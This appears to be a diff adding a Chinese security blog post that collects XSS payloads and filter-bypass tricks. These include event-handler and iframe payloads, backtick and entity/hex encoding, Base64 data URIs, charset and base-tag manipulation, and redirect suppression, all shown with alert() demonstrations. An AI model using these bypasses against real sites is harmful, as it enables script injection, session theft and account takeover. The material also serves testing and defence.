@@ -1,0 +1,864 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="XSS，没落的漏洞之王这篇总结了一下关于 XSS 的一些思考、实践利用经验以及搜集的各种 payloads">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+  <title>关于 XSS 的一些搜集 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/monokai-sublime.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"丨","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Tr0y's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                lifeline
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                gallery
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/page.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="关于 XSS 的一些搜集">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-04-10 18:59" pubdate>
+        星期二, 四月 10日 2018, 6:59 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">关于 XSS 的一些搜集</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：星期二, 十一月 10日 2020, 3:13 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>XSS，没落的漏洞之王<br>这篇总结了一下关于 XSS 的一些思考、实践利用经验以及搜集的各种 payloads<br><span id="more"></span></p>
+<h2 id="关于-XSS-的一些想法"><a href="#关于-XSS-的一些想法" class="headerlink" title="关于 XSS 的一些想法"></a>关于 XSS 的一些想法</h2><p>四步法：</p>
+<ol>
+<li>输出点在哪</li>
+<li>如何闭合原语句（或许可省略）</li>
+<li>如何插入攻击语句</li>
+<li>如何触发 XSS</li>
+</ol>
+<h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h2><p>此处内容应该会举一反三：</p>
+<p>src 可用 <code>on</code> 事件代替：<br><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;img:onclick&#x27;)&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;img:onerror&#x27;)&quot;</span> <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;img:onload&#x27;)&quot;</span>&gt;<br></code></pre></div></td></tr></table></figure></p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;video <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;video:onclick&#x27;)&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;video:onerror&#x27;)&quot;</span> <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;video:onload&#x27;)&quot;</span>&gt;&lt;/video&gt;<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;audio:onclick&#x27;)&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;audio:onerror&#x27;)&quot;</span> <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;audio:onload&#x27;)&quot;</span>&gt;&lt;/audio&gt;<br></code></pre></div></td></tr></table></figure>
+<p>img、video、audio 标签<br>onclick: 点击触发<br>onerror: 当 src 加载不出来时触发<br>onload:    当 src 加载完毕触发</p>
+<p>onerror 应该是与 onload 相互矛盾的。</p>
+<p>src 加 <code>伪协议</code> js 代码不能触发。这些标签中 src 加伪协议 js 代码不能触发，IE8 以前的时候可以</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;iframe&#x27;)&quot;</span> <span class="hljs-attribute">width</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attribute">height</span>=<span class="hljs-string">&quot;0&quot;</span>/&gt;<br></code></pre></div></td></tr></table></figure>
+<p>iframe 标签，写入后网页加载自动执行</p>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> action= <span class="hljs-string">&quot;Javascript:alert(&#x27;from_action0&#x27;)&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>= <span class="hljs-string">&quot;submit&quot;</span> formaction=<span class="hljs-string">&quot; JaVaScript:alert(&#x27;from_action2&#x27;)&quot;</span>&gt;<br><br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>= <span class="hljs-string">&quot;image&quot;</span> formaction=<span class="hljs-string">&quot; JaVaScript:alert(&#x27;from_action1&#x27;)&quot;</span>&gt;<br><br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> =<span class="hljs-string">&quot;text&quot;</span> onchange =<span class="hljs-string">&quot;JaVaScript:alert(&#x27;from_action3&#x27;)&quot;</span>&gt; <br></code></pre></div></td></tr></table></figure>
+<p>在表单中一些标签，前三个都要点击事件触发，最后一个是得到改变内容时触发</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>= <span class="hljs-string">&quot;javascript:alert(&#x27;a_onmouseover&#x27;)&quot;</span>&gt;</span>12&lt;/ a&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot; javascript:alert(&#x27;svg&#x27;)&quot;</span>&gt;</span>&lt;/svg &gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>= <span class="hljs-string">&quot;javascript:alert(&#x27;body&#x27;)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;select&#x27; )&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;textarea&#x27; )&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;keygen&#x27; )&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">keygen</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;source&#x27;)&quot;</span>&gt;</span>&lt;/ audio&gt;<br></code></pre></div></td></tr></table></figure>
+<h2 id="XSS-Bypass-经验"><a href="#XSS-Bypass-经验" class="headerlink" title="XSS Bypass 经验"></a>XSS Bypass 经验</h2><ol>
+<li><p>毫无过滤（防护）：四步法</p>
+</li>
+<li><p>过滤单引号或双引号：单引号/双引号互换使用，或者使用//：</p>
+<p><code>&lt;input onfocus=&quot;alert(/xss/)&quot; autofocus/&gt;</code></p>
+</li>
+<li><p>过滤 <code>()</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert`&#x27;1&#x27;`&quot;</span> <span class="hljs-attr">autofocus</span>/&gt;</span><br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>过滤 <code>( ) &#39;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert</span>`<span class="hljs-attr">1</span>` <span class="hljs-attr">autofocus</span>/&gt;</span><br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><code>各种替换：on</code> 替换为 <code>o_n，</code>script<code>替换为</code>scri_pt`，或者空格：大小写、空白字符（tab，可用 fuzzing 测试），双写</p>
+</li>
+<li><p>exif xss</p>
+</li>
+<li><p>urlencode：% 给 url 编码成 %25 如果在后台对参数有再次进行 urldecode，或者输出时有 urldecode 那么就可以绕过 WAF</p>
+</li>
+<li><p>Base64 编码绕过：譬如</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+&quot;</span>&gt;<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>HTML 实体编码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>= <span class="hljs-string">&#x27;javascript:alert<span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#39;</span>123<span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#41;</span> &#x27;</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>= <span class="hljs-string">&quot;j<span class="hljs-symbol">&amp;#97;</span>vascript:alert<span class="hljs-symbol">&amp;#40;</span> &#x27;123&#x27; <span class="hljs-symbol">&amp;#41;</span>&quot;</span>&gt;</span>Hello&lt;/a &gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">href</span>=  <span class="hljs-string">&quot;j<span class="hljs-symbol">&amp;#97;</span>vascript:alert<span class="hljs-symbol">&amp;#0000040;</span>  &#x27;123&#x27; <span class="hljs-symbol">&amp;#41;</span>&quot;</span>&gt;</span>Hello&lt;/a &gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">href</span>=  <span class="hljs-string">&quot;j&amp;#97vascript:alert&amp;#0000040&#x27;123&#x27; &amp;#41&quot;</span>&gt;</span>Hello&lt;/a &gt;<br></code></pre></div></td></tr></table></figure>
+<p>变形：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#49&amp;#39&amp;#41&quot;</span> <span class="hljs-attr">autofocus</span>/&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>tip：其实在标签内的所有伪协议 JS 代码都是可以不用用双引号引起来的。</p>
+<p>加上 eval 函数后甚至可以是这样的（eval 认识\x 十六进制 \八进制 \uunicode 码 ）记得把这些编码用引号引起来</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">&lt;a  href=&quot;j&amp;#97;vascript:eval(&#x27;&amp;#97;<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>29&#x27;)&quot;&gt;Hello&lt;/a&gt;<br><br>&lt;a  href=&quot;j&amp;#97;vascript:eval(&#x27;&amp;#97;<span class="hljs-symbol">\u</span>006C<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>29&#x27;)&quot;&gt;Hello&lt;/a&gt;<br><br>&lt;a  href=&quot;j&amp;#97;vascript:eval(&#x27;&amp;#97;<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>29&#x27;)&quot;&gt;Hello&lt;/a&gt;<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p>控制前端编码</p>
+<p>譬如一个 url 如下：<code>www.0d9y.cn/?charset=&#39;utf8 ′&amp;…&amp;xss=alert(/xss/)</code></p>
+<p>其实就能很简单的过 WAF 和任何函数过滤，原因很简单，你能控制 charset，这时候用一些特殊的编码，编码中会有一些字符浏览器不识别， 然后把你的注入语句中关键词插入这个编码，就能很轻松的成功触发 XSS。譬如 ISO-2022-JP 编码中的 %1b%28%4Aurl 编码，各大浏览器都是不认识的。</p>
+</li>
+<li><p>宽字节绕过</p>
+<p>记忆桩</p>
+<p>同 sql 里的宽字节注入</p>
+</li>
+<li><p>头部 Base 绕过</p>
+<p>记忆桩</p>
+<p>如果可以控制 head 中的 base 里的 src 那么接下来所有的链接文件，都是会在开头加上 base 里的 src 链接的，在自己的网站上线一个符号的 js 文件。</p>
+</li>
+</ol>
+<h2 id="其他经验"><a href="#其他经验" class="headerlink" title="其他经验"></a>其他经验</h2><h3 id="Referer-为空才可以访问"><a href="#Referer-为空才可以访问" class="headerlink" title="Referer 为空才可以访问"></a>Referer 为空才可以访问</h3><p>有一些界面为了避免是别的地方跳转过来的 Referer 必须为空，那什么情况 Referer 为空呢，第一是 HTTPS 协议到 HTTP 的协议，这时候 Referer 为空，或者用嵌入一个 iframe 用 data 加 base64 编码的方式，还可以用</p>
+<p><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot; &gt;</code></p>
+<p>来达到 referer 为空</p>
+<h2 id="注意返回的-type-类型"><a href="#注意返回的-type-类型" class="headerlink" title="注意返回的 type 类型"></a>注意返回的 type 类型</h2><p>返回什么样的类型决定了浏览器渲染还是不渲染你的 XSS 代码，只有返回的是 XML 或者 HTML 才有可能会执行成功你的 XSS 代码，不过不同浏览器的特性不同，有一些返回的 type 类型可能也是可以执行 XSS 的，尤其是一些老的 ie 浏览器，具体可以看看 freebuf 之前发布过的一篇关于 type 和浏览器执行的表格。</p>
+<h3 id="阻止浏览器-302-跳转"><a href="#阻止浏览器-302-跳转" class="headerlink" title="阻止浏览器 302 跳转"></a>阻止浏览器 302 跳转</h3><p>总所总之，浏览器遇到 302，301 会直接跟进头部的跳转链接，可是有时候 XSS 界面就是这个跳转页面，这个跳转 url 是可控的，并且在浏览器显示如果浏览器没有正确跳转，请点击 XXX 的字样。那怎么样才可以让浏览器不自动跳转呢？一种就是把跳转的 url 端口设置低于 80 譬如输入 <code>http://xss.com:0&quot;  onclick=&quot;alert(/1/)</code> ,还可以使用 CSP 策略嵌入一个 iframe 拿来配合 CRLF 进行 XSS 会很舒服</p>
+<h3 id="注意头部的-X-XSS-Protection"><a href="#注意头部的-X-XSS-Protection" class="headerlink" title="注意头部的 X-XSS-Protection"></a>注意头部的 X-XSS-Protection</h3><p>这个东西就是让浏览器帮助一起防御 XSS 为 0 则不帮助，为 1 则把可能含有的在代码中直接拿掉，还有一个是类型 1;black 这样的，就是在 url 地址直接把认为可能是 xss 的拿掉，所以有时候并不是你的 XSS 代码被服务器过滤了，还有可能是被浏览器拿走了</p>
+<h3 id="其他-xss-文章"><a href="#其他-xss-文章" class="headerlink" title="其他 xss 文章"></a>其他 xss 文章</h3><ul>
+<li>freebuf 上美团团队发的 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/185654.html">如何防止XSS攻击</a>。此篇文章的<a href="https://www.tr0y.wang/2018/11/03/XSSMeiTuan/">阅读笔记</a></li>
+</ul>
+<p><br><p style="text-align: center;" ><font size="2px" color="gray">来呀快活呀</font>
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="/img/loading.gif" lazyload style="zoom:30%" />
+</p></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">经验总结</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/04/10/XSSchallenge/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XSS 挑战之旅通关记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/08/WinPHPBug/">
+                        <span class="hidden-mobile">Windows+PHP=路径爆破?</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    <!-- Tr0y -->
+    
+      <!-- APlayer 音乐播放器 -->
+      <div id="aplayer"></div>
+      <script defer src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js" ></script>
+<link  rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+
+<script type="text/javascript">
+  function snow(icon) {
+    //1、定义一片雪花模板
+    var flake = $("<div>").css({
+        "position": "absolute",
+        "color": "#fff"
+    }).html(icon);
+
+    //获取页面的宽度，利用这个数来算出，雪花开始时left的值
+    var documentWidth = $(document).width();
+
+    //获取页面的高度 相当于雪花下落结束时Y轴的位置
+    var documentHieght = $(document).height();
+
+    //定义生成一片雪花的毫秒数
+    var millisec = 1000;
+    //2、设置第一个定时器，周期性定时器，每隔一段时间（millisec）生成一片雪花；
+    setInterval(function() {
+        //随机生成雪花下落 开始 时left的值，相当于开始时X轴的位置
+        var startLeft = Math.random() * documentWidth;
+
+        //随机生成雪花下落 结束 时left的值，相当于结束时X轴的位置
+        var endLeft = Math.random() * documentWidth;
+
+        //随机生成雪花大小
+        var flakeSize = 20 + 10 * Math.random();
+
+        //随机生成雪花下落持续时间
+        var durationTime = 4000 + 7000 * Math.random();
+
+        //随机生成雪花下落 开始 时的透明度
+        var startOpacity = 0.7 + 0.3 * Math.random();
+
+        //随机生成雪花下落 结束 时的透明度
+        var endOpacity = 0.2 + 0.2 * Math.random();
+
+        //3、克隆一个雪花模板,定义雪花的初始样式，拼接到页面中
+        flake.clone().appendTo($("body")).css({
+            "left": startLeft,
